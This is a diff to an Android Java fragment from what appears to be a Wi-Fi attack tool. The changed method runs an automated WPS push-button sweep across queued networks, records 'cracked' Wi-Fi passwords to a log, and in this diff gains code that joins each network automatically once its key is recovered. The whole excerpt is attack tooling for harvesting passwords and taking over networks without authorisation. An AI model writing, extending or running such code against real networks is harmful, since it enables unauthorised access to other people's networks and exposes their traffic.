@@ -816,8 +816,8 @@ public class Wifi extends Fragment {
      */
     public void runWpsPbc(ArrayList<WiFINetwork> list) {
         if (list == null) return;
-        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_PIXIE,
-                "Preparing PBC scan", list.size() + " WPS networks queued");
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_WPS_PBC,
+                "Auto WPS Sweep", list.size() + " WPS networks queued");
         final AtomicBoolean cancelAttack = new AtomicBoolean(false);
         final AdvancedProcess[] pbc = {null};
         final Timer[] timer = {new Timer()};
@@ -828,7 +828,7 @@ public class Wifi extends Fragment {
         monitor.metric(AttackMetric.PROGRESS, "0 / " + list.size());
         monitor.metric(AttackMetric.CRACKED, 0);
         monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
-        monitor.note("Auto WPS PBC – simulating push-button on each router");
+        monitor.note("Auto WPS Capture – waiting for router push-button events…");
 
         monitor.secondary("Skip this network", () -> {
             if (pbc[0] != null) {
@@ -890,7 +890,7 @@ public class Wifi extends Fragment {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
                         WiFINetwork result = pixieParse(outputList);
-                        if (result.getOK()) {
+                        if (result.getOK() && result.getPsk() != null && !result.getPsk().isEmpty()) {
                             totalSuccess[0]++;
                             monitor.note(temp.getSsid() + " – PBC cracked: " + result.getPsk());
                             if (core.isStoreEnabled()) {
@@ -901,6 +901,10 @@ public class Wifi extends Fragment {
                             monitor.showCrackedLog(crackedLog.toString());
                             core.vibrate(500);
                             AttackMonitor.triggerLightningEffect(activity);
+
+                            // Auto Connect immediately on WPS PBC crack!
+                            core.connectWiFi2(temp.getSsid(), result.getPsk());
+                            activity.runOnUiThread(() -> core.toaster("Auto-connecting to " + temp.getSsid() + "..."));
                         }
                         total[0]++;
                         tried.add(temp.getMac());
